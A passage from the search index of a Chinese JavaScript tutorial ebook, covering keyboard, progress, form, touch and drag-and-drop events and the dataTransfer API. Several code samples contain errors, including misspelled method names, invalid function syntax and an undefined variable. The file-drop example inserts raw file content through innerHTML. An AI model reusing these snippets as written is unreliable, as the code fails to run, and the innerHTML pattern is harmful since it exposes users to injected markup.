\u952e\uff0c\u9ed8\u8ba4\u4e3afalse\u3002 altKey\uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Alt \u952e\uff0c\u9ed8\u8ba4\u4e3afalse\u3002 metaKey\uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Meta \u952e\uff0c\u9ed8\u8ba4\u4e3afalse\u3002 repeat\uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u91cd\u590d\u6309\u952e\uff0c\u9ed8\u8ba4\u4e3afalse\u3002</p> <p>\u6784\u9020\u51fd\u6570\u7684\u5c5e\u6027\u540c\u6837\u9002\u5e94\u4e8e\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5c5e\u6027</p> <pre><code>e.altKey, e.ctrlKey, e.metaKey, e.shiftKey\ne.code \u8fd4\u56de\u5f53\u524d\u6309\u952e\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f(KeyA)\ne.key \u8fd4\u56de\u6309\u4e0b\u952e\u7684\u540d\u79f0(\u5982\u679c\u662f\u529f\u80fd\u952e\uff0c\u8fd4\u56de\u952e\u503c) \u5c5e\u6027\u53ea\u8bfb\ne.location \u8fd4\u56de\u952e\u7684\u4f4d\u7f6e(\u4e3b\u952e\u76d80\uff0c\u5de6\u53f3\uff0c\u5c0f\u952e\u76d8)\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662f\u4e2a\u9e21\u808b(\u4e0d\u80fd\u8fd4\u56de\u5177\u4f53\u7684\u952e)\ne.repeat \u5224\u65ad\u662f\u5426\u91cd\u590d\u70b9\u51fb\u67d0\u4e2a\u952e\n</code></pre> <p>\u5b9e\u4f8b\u5bf9\u8c61\u7684\u65b9\u6cd5</p> <pre><code>e.getModifierState('Alt') // \u5224\u65ad\u662f\u5426\u6309\u4e0b\u529f\u80fd\u952e\nif (e.getModifierState('Alt')+e.getModifierState('Control')+e.getModifierState('Meta')&gt;1) {\n  // do sth\n}\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#96","title":"9.6\u8fdb\u5ea6\u4e8b\u4ef6","text":"<p>\u5916\u90e8\u8d44\u6e90\u5f02\u6b65\u52a0\u8f7d\u65f6\uff0c\u4f8b\u5982 image\uff0clink\uff0cvideo, audio \u7b49\u8d44\u6e90\u52a0\u8f7d\u65f6\u89e6\u53d1\u7684\u4e8b\u4ef6\uff0c\u6216\u8005\u6587\u4ef6\u4e0a\u4f20\uff08File upload\uff09\uff0c\u7ee7\u627f\u4e86 ProgressEvent \u4e8b\u4ef6\u63a5\u53e3\uff0c\u4e3b\u8981\u5305\u62ec\u4e0b\u9762\u51e0\u4e2a\u4e8b\u4ef6\uff1a</p> <pre><code>abort (\u9000\u51fa)\uff1a\u7528\u6237\u4e3b\u52a8\u70b9\u51fb\u9000\u51fa\u4e8b\u4ef6\nerror \u7f51\u7edc\u9519\u8bef\u7b49\u9020\u6210\u7684\u4e2d\u65ad\nloadstart \nload\nloadend \u52a0\u8f7d\u5f00\u59cb\uff0c\u52a0\u8f7d\u6210\u529f\uff0c\u52a0\u8f7d\u7ed3\u675f\nprogress \u52a0\u8f7d\u4e2d(\u4e0d\u65ad\u89e6\u53d1)\ntimeout \u52a0\u8f7d\u8d85\u65f6\n</code></pre> <p>\u6ce8\u610f\uff1a\u5982\u679c\u5728\u811a\u672c\u52a0\u8f7d\u524d\uff0c\u8d44\u6e90\u5df2\u7ecf\u52a0\u8f7d\uff0c\u90a3\u4e48\u76d1\u542cimg\u7684load\u4e8b\u4ef6\u5c31\u6ca1\u6709\u5fc5\u8981\u4e86\u3002\u53ef\u4ee5\u5728\u4e8b\u4ef6\u76d1\u542c\u524d\u5224\u65ad\u4e00\u4e0b\u811a\u672c\u662f\u5426\u52a0\u8f7d\u3002</p> <p>onerror \u4e8b\u4ef6\u9700\u8981\u5728DOM\u8282\u70b9\u5185\u90e8\u76d1\u542c\u3002</p> <pre><code>&lt;img src='wrongURL' onerror=\"this.style.display='none';\"/&gt;\n</code></pre> <pre><code>let image = document.getElementById('#avatar');\nif (!image.complete) {\n  image.addEventListener('load', (e) =&gt; {\n    image.classList.add('finished');\n  });\n}\n</code></pre> <p>\u6ce8\u610f2\uff1aloadend \u4e8b\u4ef6\u4f1a\u5728 abort error load \u4e8b\u4ef6\u540e\u6267\u884c\uff08\u4e0d\u7ba1\u52a0\u8f7d\u6210\u529f\u5931\u8d25loadend\u4e8b\u4ef6\u90fd\u4f1a\u6700\u540e\u6267\u884c\uff09\u6240\u4ee5\u53ef\u4ee5\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u540e\u9762\u589e\u52a0\u5904\u7406\u51fd\u6570\u3002</p> <p>\u6ce8\u610f3\uff1aerror \u4e8b\u4ef6\u4e0d\u4f1a\u5192\u6ce1\uff0c\u5b50\u5143\u7d20\u7684error\u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1\u7236\u5143\u7d20\u7684\u4e8b\u4ef6\u76d1\u542c\u3002</p> <p>\u6784\u9020\u51fd\u6570API\uff1a\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u63cf\u8ff0\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u7684\u8fdb\u5ea6\uff0c\u4f8b\u5982\u4e0a\u9762\u7684\u591a\u5a92\u4f53\u52a0\u8f7d</p> <pre><code>let e = new ProgressEvent(type, options);\n</code></pre> <p>\u5b9e\u4f8b\u5c5e\u6027 lengthComputable \u8868\u793a\u52a0\u8f7d\u603b\u91cf\u662f\u5426\u53ef\u4ee5\u8ba1\u7b97\uff0c\u9ed8\u8ba4\u662ffalse loaded \u5df2\u52a0\u8f7d\u7684\u90e8\u5206 total \u603b\u91cf \u4f7f\u7528 e.loaded / e.total \u53ef\u4ee5\u8ba1\u7b97\u52a0\u8f7d\u7684\u767e\u5206\u6bd4</p> <p>\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u4e8b\u4ef6\uff0c\u6784\u9020\u51fd\u6570\u7684options\u548c\u5b9e\u4f8b\u5c5e\u6027\u76f8\u540c\uff08JS\u4f8b\u5b50\uff09\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#97","title":"9.7 \u8868\u5355\u4e8b\u4ef6","text":""},{"location":"ebook-JS-basic/09-Event/#input","title":"input","text":"<p>input select textarea \u5143\u7d20\u4f1a\u89e6\u53d1 input \u4e8b\u4ef6\uff0c\u7ee7\u627f\u81ea Inputvent \u6784\u9020\u51fd\u6570\u3002\u8fd9\u4e2a\u4e8b\u4ef6\u5728\u7528\u6237\u89e6\u53d1\u65f6\u4f1a\u9891\u7e41\u89e6\u53d1\u3002input \u4e8b\u4ef6\u76f8\u5bf9\u4e8e change \u4e8b\u4ef6\uff0cchange \u4e8b\u4ef6\u5728\u8f93\u5165\u6846\u5931\u53bb\u7126\u70b9\u540e\u89e6\u53d1\uff0c\u4f46\u662finput\u4e8b\u4ef6\u4f1a\u59cb\u7ec8\u89e6\u53d1\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#select","title":"select","text":"<p>\u9009\u4e2d\u6587\u672c\u4e8b\u4ef6\uff1a\u5728 input textarea \u4e2d\uff0c\u5982\u679c\u9009\u4e2d\u6587\u672c\uff0c\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5c5e\u6027\u83b7\u53d6\u6587\u672c\u4fe1\u606f</p> <pre><code>&lt;input id=\"test\" type=\"text\"&gt;&lt;/input&gt;\n\nlet ele = document.getElementById('#test');\nele.addEventListener('select', (e) =&gt; {\n  console.log(e.type === 'select');\n}, false);\n\ne.target.value (selectionirection selectionStart selectionEnd) \u53ef\u4ee5\u83b7\u53d6\u9009\u4e2d\u7684\u6587\u672c\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#change","title":"change","text":"<p>change \u4e8b\u4ef6\u4f1a\u5728\u8f93\u5165\u5143\u7d20\u53d8\u5316\u65f6\u89e6\u53d1\uff0c\u4e0d\u4f1a\u8fde\u7eed\u89e6\u53d1\uff0cinput \u4e8b\u4ef6\u5fc5\u7136\u4f34\u968f\u7740 select \u4e8b\u4ef6</p> <ul> <li>\u6fc0\u6d3b\u5355\u9009\u6846\u6216\u8005\u590d\u9009\u6846 radio checkbox \u4f1a\u89e6\u53d1</li> <li>\u7528\u6237\u63d0\u4ea4\uff1a\u4f8b\u5982 select \u6216\u8005\u65e5\u671f\u7ec4\u4ef6\uff08\u5bf9\u4e8eselect\u5143\u7d20\uff0cinput\u4e8b\u4ef6\u548cchange\u4e8b\u4ef6\u57fa\u672c\u76f8\u7b49\uff09</li> <li>\u5f53\u6587\u672c\u6846 input type=text \u6216\u8005 textarea \u7684\u503c\u53d1\u751f\u6539\u53d8\uff0c\u5e76\u4e14\u5931\u53bb\u7126\u70b9\u540e\u89e6\u53d1</li> </ul>"},{"location":"ebook-JS-basic/09-Event/#invalid","title":"invalid","text":"<p>\u5f53\u8868\u5355\u662f\u5fc5\u586b\u9879\uff0c\u5982\u679c\u4e0d\u586b\uff0c\u70b9\u51fb\u63d0\u4ea4\u65f6\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6(\u6216\u8005\u4e0d\u6ee1\u8db3\u8f93\u5165\u6846\u7684\u6761\u4ef6)</p> <pre><code>&lt;form&gt;\n  &lt;input type=\"text\" required oninvalid=\"console.log('invalid input')\" /&gt;\n  &lt;button type=\"submit\"&gt;\u63d0\u4ea4&lt;/button&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#reset-submit","title":"reset submit","text":"<p>\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u53d1\u751f\u5728\u8868\u5355\u5bf9\u8c61  form \u4e0a\u9762\uff0c\u5e76\u4e0d\u662f\u5728\u8868\u5355\u6210\u5458 button \u4e0a\u9762\uff08\u63d0\u4ea4\u7684\u662f\u8868\u5355\u4e0d\u662f\u6309\u94ae\uff09\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#_3","title":"\u6784\u9020\u51fd\u6570","text":"<p>InputEvent \u5b9e\u4f8b\u5c5e\u6027\u662f\u53ea\u8bfb\u7684</p> <pre><code>let e = new InputEvent(type, options);\noptions = {\n  data \u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d8\u52a8\u540e\u7684\u5185\u5bb9\n  inputType \u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d8\u66f4\u7684\u7c7b\u578b(insertText\uff0cinsertFromPaste\uff0c\u8f93\u5165\u6587\u672c\u6216\u8005\u7c98\u8d34\u6587\u672c)\n  dataTransfer \u8fd4\u56de DataTransfer \u5b9e\u4f8b\u3002\u8be5\u5c5e\u6027\u53ea\u5728\u6587\u672c\u6846\u63a5\u53d7\u7c98\u8d34\u5185\u5bb9\uff08insertFromPaste\uff09\u6216\u62d6\u62fd\u5185\u5bb9\uff08insertFromDrop\uff09\u65f6\u624d\u6709\u6548\n};\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#98","title":"9.8 \u89e6\u6478\u4e8b\u4ef6","text":"<p>\u89e6\u6478\u4e8b\u4ef6 API Touch TouchList TouchEvent\u3002\u591a\u4e2aTouch\u540c\u65f6\u53d1\u751f\u6784\u6210TouchList\u3002\u89e6\u6478\u5c4f\u8bbe\u5907\u4f1a\u89e6\u53d1\u8fd9\u90e8\u5206\u4e8b\u4ef6\u3002\u901a\u5e38\u60c5\u51b5\uff0ctouch\u4e8b\u4ef6\u548c\u9f20\u6807\u4e8b\u4ef6\u540c\u65f6\u53d1\u751f\uff08\u907f\u514d\u67d0\u4e9b\u4ee3\u7801\u6ca1\u6709\u7528\u5230\u89e6\u6478\u4e8b\u4ef6\uff09\uff0c\u5355\u7eaf\u4f7f\u7528Touch\u4e8b\u4ef6\u9700\u8981\u628a\u9f20\u6807\u4e8b\u4ef6 e.preventDefault() \u5904\u7406\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#touch","title":"Touch","text":"<p>Touch \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u521b\u5efaTouch\u5b9e\u4f8b\u3002\u4e0eclick\u4e8b\u4ef6\u4e0d\u540c\u7684\u5730\u65b9\uff1aTouch\u4e8b\u4ef6\u662f\u4e00\u4e2a\u692d\u5706\u5f62\u533a\u57df\uff0c\u538b\u529b\u53c2\u6570\uff08\u624b\u6307\u89e6\u6478\u6216\u8005\u7b14\u5c16\u89e6\u6478\uff09\u3002\u5b9e\u4f8b\u5c5e\u6027\u548c\u6784\u9020\u51fd\u6570\u53c2\u6570\u76f8\u540c\u3002</p> <pre><code>let touch = new Touch(options);\nlet options = {\n  identifer: 10, // \u552f\u4e00\u6807\u8bc6\uff0c\u89e6\u6478\u8fc7\u7a0b\u4e2d\u4e0d\u53d8\n  target: div,\n  clientX: \n  clientY:\n  screenX:\n  screenY:\n  pageX:\n  pageY:\n  radiusX: \u89e6\u6478\u533a\u57df\u5f71\u54cdX\u8f74\u7684\u957f\u5ea6(px) \u4e58\u4ee52\u5c31\u662f\u5b9e\u9645\u7684\u957f\u5ea6\u6216\u8005\u5bbd\u5ea6\n  radiusY: Y\u8f74\u7684\u957f\u5ea6\n  rotationAngle: [0, 90] \u65cb\u8f6c\u89d2\u5ea6(\u89e6\u6478\u533a\u57df\u692d\u5706\u65cb\u8f6c\u89d2\u5ea6)\n  force: [0, 1] \u538b\u529b(0-1)\n}\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#touchlist","title":"TouchList","text":"<p>\u89e6\u6478\u4e8b\u4ef6\u7684\u96c6\u5408\uff0cAPI</p> <pre><code>TouchList.length === 2\nTouchList.item(1)\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#touchevent","title":"TouchEvent","text":"<p>\u6784\u9020\u51fd\u6570\u7ee7\u627f\u81ea Event \u4e8b\u4ef6</p> <pre><code>let e = new TouchEvent('type', options);\noptions = {\n  crtlKey:\n  altKey:\n  metaKey:\n  shiftKey:\n  touches: [] \u5f53\u524d\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u7684\u89e6\u6478\u70b9\n  targetTouches: [] \u4f4d\u4e8e\u89e6\u6478\u76ee\u6807DOM\u5185\u90e8\u4e14\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u7684\u89e6\u6478\u70b9\n  changedTouche: [] \u672c\u6b21\u89e6\u6478\u8fc7\u7a0b\u7684\u76f8\u5173\u89e6\u6478\u70b9\n};\n</code></pre> <p>\u5b9e\u4f8b\u5c5e\u6027\u662f\u53ea\u8bfb\u5c5e\u6027\uff0c\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u7684\u53c2\u6570</p>"},{"location":"ebook-JS-basic/09-Event/#touchevent_1","title":"TouchEvent \u5206\u7c7b","text":"<p>touchstart</p> <p>touchend \u89e6\u6478\u7ed3\u675f\u6216\u8005\u89e6\u6478\u5230\u5c4f\u5e55\u8fb9\u7f18</p> <p>touchmove</p> <p>touchcancel \u89e6\u6478\u65f6\u5f39\u51fa\u83dc\u5355\u6216\u8005\u5bf9\u8bdd\u6846\uff0c\u6216\u8005\u7528\u6237\u7684\u89e6\u6478\u70b9\u5f88\u591a\uff0c\u89e6\u6478\u4e8b\u4ef6\u53d6\u6d88</p> <pre><code>var el = document.getElementsByTagName('canvas')[0];\nel.addEventListener('touchstart', onStart, false);\nel.addEventListener('touchmove', onMove, false);\n\nfunction onStart = (e) =&gt; {\n  e.preventDefault();\n  let touches = e.changedTouches;\n  for (let i = 0; i &lt; touches.length; i++) {\n    console.log(touches[i].pageX, touches[i].pageY);\n    // \u83b7\u53d6\u5f00\u59cb\u89e6\u6478\u70b9(\u591a\u4e2a)\u7684\u9875\u9762\u5750\u6807\n  }\n}\n\nfunction onMove(e) {\n  e.preventDefault();\n  var touches = e.changedTouches;\n  for (var i = 0; i &lt; touches.length; i++) {\n    console.log(touches[i].pageX, touches[i].pageY);\n    // \u89e6\u6478\u70b9\u79fb\u52a8\u65f6\u5750\u6807\u7684\u53d8\u5316\n  }\n}\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#99","title":"9.9 \u62d6\u62fd\u4e8b\u4ef6","text":"<p>DragEvent \u5177\u6709 dataTransfer \u7684\u5c5e\u6027\uff0c\u8fd9\u4e2a\u5c5e\u6027\u5f88\u91cd\u8981\uff01dataTransfer \u5177\u6709\u5f88\u591a\u5c5e\u6027\u548c\u65b9\u6cd5</p>"},{"location":"ebook-JS-basic/09-Event/#1","title":"1.\u62d6\u62fd\u5bf9\u8c61","text":"<p>\u62d6\u62fd\u5bf9\u8c61\uff1a\u88ab\u62d6\u62fd\u7684\u5bf9\u8c61\uff08\u4f8b\u5982\u6587\u4ef6\u6216\u8005\u56fe\u7247\u94fe\u63a5\uff09\uff0c\u62d6\u62fd\u5bf9\u8c61\u7ecf\u8fc7\u7684\u5bf9\u8c61\uff08div\uff0c\u62d6\u62fd\u5bf9\u8c61\u53ef\u4ee5\u653e\u5165div\u4e2d\uff09</p> <p>\u53ef\u62d6\u62fd\u5c5e\u6027\uff1a\u7f51\u9875\u4e2d\u7684\u56fe\u7247\u3001\u94fe\u63a5\u3001\u9009\u4e2d\u7684\u6587\u672c\u9ed8\u8ba4\u53ef\u4ee5\u62d6\u52a8\uff0c\u5176\u4ed6\u5143\u7d20\u9ed8\u8ba4\u4e0d\u53ef\u62d6\u52a8\u3002\u5982\u679c\u5728 div \u5185\u90e8\u8bbe\u7f6e draggable = 'true' \u540e\uff0c\u8fd9\u4e2aDIV\u5c31\u662f\u53ef\u4ee5\u62d6\u52a8\u7684\u3002\u5bf9\u4e8e img \u548c a \uff0c\u8fd9\u4e2a\u5c5e\u6027\u9ed8\u8ba4\u662f true\u3002\u5b9e\u9645\u4e2d\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u56fe\u7247\u6216\u8005\u94fe\u63a5\u662f\u4e0d\u53ef\u4ee5\u62d6\u52a8\u7684\u3002\u5982\u679c\u67d0\u5143\u7d20\u662f\u53ef\u4ee5\u62d6\u52a8\u7684\uff0c\u5c31\u65e0\u6cd5\u7528\u9f20\u6807\u9009\u4e2d\u5185\u90e8\u7684\u6587\u672c\u3002</p> <pre><code>&lt;div draggable=\"true\"&gt;&lt;/div&gt;\n&lt;img draggable=\"false\"/&gt;\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#2","title":"2.\u62d6\u62fd\u4e8b\u4ef6","text":"<p>\u88ab\u62d6\u62fd\u5bf9\u8c61\u7684\u4e8b\u4ef6</p> <pre><code>dragstart: \u5f00\u59cb\u62d6\u62fd\uff0c\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e0a\uff0c\u6307\u5b9a\u62d6\u62c9\u7684\u6570\u636e(image)\ndrag: \u62d6\u62fd\u4e2d\uff0c\u51e0\u767ems\u89e6\u53d1\u4e00\u6b21\ndragend\uff1a\u62d6\u62fd\u7ed3\u675f(\u91ca\u653e\u9f20\u6807\u6216\u8005ESC) \u4e0e dragstart \u6210\u5bf9\u51fa\u73b0\n</code></pre> <p>\u63a8\u62fd\u5bf9\u8c61\u7ecf\u8fc7\u5143\u7d20\u7684\u4e8b\u4ef6 </p> <pre><code>dragenter\uff1a\u88ab\u62d6\u62fd\u5143\u7d20\u8fdb\u5165div\u540e\uff0cdiv\u89e6\u53d1\u4e00\u6b21\u4e8b\u4ef6\uff1b\u5728\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u4e2d\u5904\u7406div\u662f\u5426\u5141\u8bb8 drop \u4e8b\u4ef6\u653e\u4e0b\u62d6\u62fd\u7684\u6570\u636e(\u9ed8\u8ba4div\u4e0d\u5141\u8bb8drop\u4e8b\u4ef6)\uff1b\ndragover\uff1aDIV \u5143\u7d20\u6301\u7eed\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6(\u53ea\u8981\u6ca1\u6709\u79bb\u5f00\u8fd9\u4e2aDIV)\ndragleave\uff1aimg \u79bb\u5f00DIV\u8303\u56f4\u540e\u89e6\u53d1\ndrop\uff1a\u5728\u76ee\u6807\u8282\u70b9DIV\u4e0a\u91ca\u653e\u9f20\u6807\u89e6\u53d1\uff0c\u76d1\u542c\u51fd\u6570\u53ef\u4ee5\u53d6\u51fa\u6570\u636e\u5e76\u5904\u7406(\u76ee\u6807\u8282\u70b9DIV\u9700\u8981\u9884\u8bbe\u5141\u8bb8drop)\n</code></pre> <p>\u6ce8\u610f</p> <ul> <li> <p>\u62d6\u62fd\u4e8b\u4ef6\u4e2d\uff0c\u9f20\u6807\u79fb\u52a8\u4f46\u662f\u4e0d\u4f1a\u89e6\u53d1\u9f20\u6807\u4e8b\u4ef6</p> </li> <li> <p>\u628a\u6587\u4ef6\u4ece\u684c\u9762\u62d6\u8fdb\u6d4f\u89c8\u5668\uff0c\u4e0d\u4f1a\u89e6\u53d1 dragstart dragend \u4e8b\u4ef6</p> </li> <li> <p>dragenter dragover \u7684\u76d1\u542c\u51fd\u6570\u7528\u4e8e\u5904\u7406\u62d6\u62fd\u6570\u636e\uff0c\u4f46\u662f\u5927\u90e8\u5206DIV\u9ed8\u8ba4\u8bbe\u7f6e\u4e0d\u80fddrop\u4e8b\u4ef6\uff0c\u6240\u4ee5\u5fc5\u987b\u963b\u6b62\u9ed8\u8ba4\u4e8b\u4ef6</p> </li> </ul> <pre><code>&lt;div ondragover=\"event.preventDefault()\"&gt;&lt;/div&gt;\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#3","title":"3.\u62d6\u62fd\u5b9e\u4f8b","text":"<pre><code> &lt;div class=\"dropzone\"&gt;\n   &lt;div id=\"draggable\" draggable=\"true\"&gt;\n     \u8be5\u8282\u70b9\u53ef\u62d6\u62c9\n   &lt;/div&gt;\n &lt;/div&gt;\n &lt;div class=\"dropzone\"&gt;&lt;/div&gt;\n</code></pre> <p>\u62d6\u62fd\u4e8b\u4ef6</p> <pre><code>var dragged;\n\n// for dragged image\ndocument.addEventListener('dragstart', (e) =&gt; {\n  dragged = e.target;\n  dragged.style.opacity = 0.5;\n}, false);\ndocument.addEventListener('dragend', (e) =&gt; {\n  e.target.style.opacity = '';\n}, false);\n\ndocument.addEventListenrt('dragover', (e) =&gt; {\n  e.preventDefault();\n  // \u9632\u6b62\u62d6\u62c9\u6548\u679c\u88ab\u91cd\u7f6e\uff0c\u5141\u8bb8\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u653e\u5165\u76ee\u6807\u8282\u70b9\n}, false);\ndocument.addEventListerer('dragenter', (e) =&gt; {\n  if (e.target.className === 'dropzone') {\n    // \u7531\u4e8e\u8be5\u4e8b\u4ef6\u4f1a\u5192\u6ce1\uff0c\u6240\u4ee5\u8981\u8fc7\u6ee4\u8282\u70b9\n    e.target.style.background = 'red';\n  }\n}, false);\ndocument.addEventListerer('dragleave', (e) =&gt; {\n  e.target.style.background = '';\n}, false);\n\ndocument.addEventListerer('drop', (e) =&gt; {\n  e.preventDefault(); // \u9632\u6b62\u4e8b\u4ef6\u9ed8\u8ba4\u884c\u4e3a\uff08\u6bd4\u5982\u67d0\u4e9b\u5143\u7d20\u8282\u70b9\u4e0a\u53ef\u4ee5\u6253\u5f00\u94fe\u63a5\uff09\n  if (e.target.className === 'dropzone') {\n    e.target.style.background = '';\n    dragged.parentNode.removeChild(dragged);\n    e.target.appendChilde(dragged);\n  }\n}, false);\n</code></pre> <p>\u62d6\u62fd\u4e8b\u4ef6\u7ee7\u627f\u4e8e\u6784\u9020\u51fd\u6570  dragEvent</p> <pre><code>let e = new dragEvent(type, options);\ntype \u662f\u62d6\u62fd\u4e8b\u4ef6\u7684\u7c7b\u578b\noptions \u662fnull\u6216\u8005\u662f dataTranster \u7684\u5b9e\u4f8b\u5bf9\u8c61\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#4-datatransfer","title":"4\u3001\u6570\u636e\u4f20\u8f93\u5668 dataTransfer","text":"<p>dragEvent \u5177\u6709\u4e00\u4e2a dataTransfer \u5c5e\u6027\uff0c\u7528\u6765\u8bfb\u5199\u9700\u8981\u4f20\u9012\u7684\u5c5e\u6027\u3002\u8fd9\u4e2a\u5c5e\u6027\u7ee7\u627f dataTranster \u6784\u9020\u51fd\u6570</p> <pre><code>let dataTransfer = new dataTransfer(); // \u6784\u9020\u51fd\u6570\u65e0\u53c2\u6570\n</code></pre> <p>\u6570\u636e\u4f20\u9012\u5668\u5305\u542b\uff1a\u6570\u636e\u7684\u7c7b\u578b\uff08\u6587\u4ef6\u683c\u5f0f\uff0ctext/plain image/png\uff09\u548c\u6570\u636e\u7684\u503c\u3002</p> <p>\u62d6\u62fd\u4e8b\u4ef6\u4e2d\uff0cdragenter dragover \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u53ef\u4ee5\u5224\u65ad\u5f53\u524d\u7684\u6570\u636e\u7c7b\u578b\uff0c\u786e\u5b9a\u5f53\u524d\u7684 div \u80fd\u5426\u63a5\u53d7\u8fd9\u4e2a\u6570\u636e\u7c7b\u578b\uff08\u662f\u5426\u652f\u6301drop\u4e8b\u4ef6\uff09\u3002\u53d1\u751f drop \u4e8b\u4ef6\u65f6\uff0c\u76d1\u542c\u51fd\u6570\u4ecedataTransfer \u4e2d\u53d6\u51fa\u6570\u636e\u7684\u503c\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#5","title":"5\u3001\u6570\u636e\u4f20\u8f93\u5668\u7684\u5c5e\u6027","text":""},{"location":"ebook-JS-basic/09-Event/#51-datatransferdropeffect","title":"5.1 dataTransfer.dropEffect","text":"<pre><code>dataTransfer.dropEffect = 'copy' 'move' 'link' 'none';\n\u8bbe\u7f6e\u653e\u4e0b\u88ab\u62d6\u62fd\u8282\u70b9\u7684\u6548\u679c(\u9f20\u6807\u5f62\u72b6\u6539\u53d8)\u5176\u4ed6\u503c\u662f\u65e0\u6548\u7684\u3002\u8fd9\u4e2a\u5c5e\u6027\u5728 dragenter dragover \u4e8b\u4ef6\u4e2d\u76d1\u542c\uff0c\u8fd9\u4e2a\u5c5e\u6027\u5bf9\u4e8e\u88ab\u62d6\u62fd\u8282\u70b9\u662f\u65e0\u6548\u7684\uff0c\u53ea\u5bf9DIV\u6709\u6548\u679c\uff08\u9f20\u6807\u53d8\u5316\uff09\u3002\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#52-datatransfereffectallowed","title":"5.2 dataTransfer.effectAllowed","text":"<pre><code>dataTransfer.effectAllowed = 'copy' 'move' 'link' 'all' ...\n\u8bbe\u7f6e\u672c\u6b21\u62d6\u62c9\u4e2d\u5141\u8bb8\u7684\u6548\u679c:\u8fd9\u4e2a\u5c5e\u6027\u4e0edropEffect\u5c5e\u6027\u662f\u540c\u4e00\u4ef6\u4e8b\u7684\u4e24\u4e2a\u65b9\u9762\u3002\u524d\u8005\u8bbe\u7f6e\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u5141\u8bb8\u7684\u6548\u679c\uff0c\u540e\u8005\u8bbe\u7f6e\u63a5\u53d7\u62d6\u62c9\u7684\u533a\u57df\u7684\u6548\u679c\uff0c\u5b83\u4eec\u5f80\u5f80\u914d\u5408\u4f7f\u7528\u3002 \u8fd9\u4e2a\u5c5e\u6027\u5728 dragstart \u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u4e2d\u8bbe\u7f6e\u3002\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#53-datatransferfiles","title":"5.3 dataTransfer.files","text":"<p>dataTransfer.files \u662f\u4e00\u4e2a fileList \u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u6765\u62d6\u62fd\u6587\u4ef6\u3002\u53ef\u4ee5\u4f7f\u7528 FileReader \u8bfb\u53d6\u6587\u4ef6\u7684\u5185\u5bb9</p> <p>fileList and FileReader example</p> <pre><code>&lt;div id=\"output\" style=\"min-height: 200px;border: 1px solid black;\"&gt;\u6587\u4ef6\u62d6\u62c9\u5230\u8fd9\u91cc&lt;/div&gt;\n</code></pre> <pre><code>var div = document.getElementById('output');\n\ndiv.addEventListener(\"dragenter\", function(event) {\n  div.textContent = '';\n  event.stopPropagation();\n  event.preventDefault();\n}, false);\n\ndiv.addEventListener(\"dragover\", function(event) {\n  event.stopPropagation();\n  event.preventDefault();\n}, false);\n\ndiv.addEventListener('drop', (e) =&gt; {\n  e.stopPropagation();\n  e.preventDefault();\n  let files = e.dataTransfer.files;\n  for (var i = 0; i &lt; files.length; i++) {\n    // get files names and info(size)\n    div.textContent += files[i].name + files[i].size;\n  }\n\n  if (files.length === 0) return;\n  let file = files[0];\n  let reader = new FileReader();\n  // set reader loadend fucntion\n  reader.onloadend = (e) =&gt; {\n    if (e.target.readyState === FileReader.DONE) {\n      let content = reader.result;\n      div.innerHTML = file.name + content;\n    }\n  }\n  // start to read file\n  reader.readAsBinaryString(file);\n}, false);\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#54-datatransfertypes","title":"5.4 dataTransfer.types","text":"<p>\u8fd9\u4e2a\u5c5e\u6027\u662f\u53ea\u8bfb\u7684\u6570\u7ec4\uff0c\u6bcf\u4e00\u9879\u662f\u62d6\u62c9\u6570\u636e\u7684\u6587\u4ef6\u7c7b\u578b\u3002\u53ef\u4ee5\u5728 dragover \u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u4e2d\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\uff0c\u786e\u5b9a\u662f\u5426\u53ef\u4ee5 drop \u6587\u4ef6</p> <pre><code>function containsFile(filelist, value) {\n  if (filelist.length === 0) {\n    return false;\n  }\n  for (let i = 0; i &lt; filelist.length; i++) {\n    if (list[i] === value) {\n      return 